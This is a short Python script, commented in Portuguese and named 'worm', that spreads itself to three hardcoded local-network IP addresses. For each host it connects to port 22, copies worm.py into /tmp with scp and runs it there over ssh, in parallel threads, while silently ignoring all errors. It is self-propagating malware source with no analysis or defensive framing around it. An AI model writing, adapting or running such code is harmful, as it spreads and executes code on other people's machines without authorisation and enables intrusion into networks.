import socket
import threading
import queue
import subprocess

def worm():
    alvos = ["192.168.0.78", "192.168.0.10", "192.168.0.65"]

    thread_queue = queue.Queue()
    
    # Adiciona as threads na fila
    for i in range(len(alvos)):
        thread_queue.put(i)
    
    # Cria as threads e as executa
    while not thread_queue.empty():
        i = thread_queue.get()
        t = threading.Thread(target=execute_worm, args=(alvos[i],))
        t.start()

def execute_worm(ip):
    try:
        # Conecta ao servidor na porta 22
        s = socket.socket()
        s.connect((ip, 22))
        
        # Envia o worm para o servidor
        subprocess.call(["scp", "worm.py", f"{ip}:/tmp"])
        
        # Executa o worm no servidor
        subprocess.call(["ssh", f"{ip}", "python /tmp/worm.py"])
        
        # Fecha a conexão
        s.close()
    except:
        pass

if __name__ == "__main__":
    worm()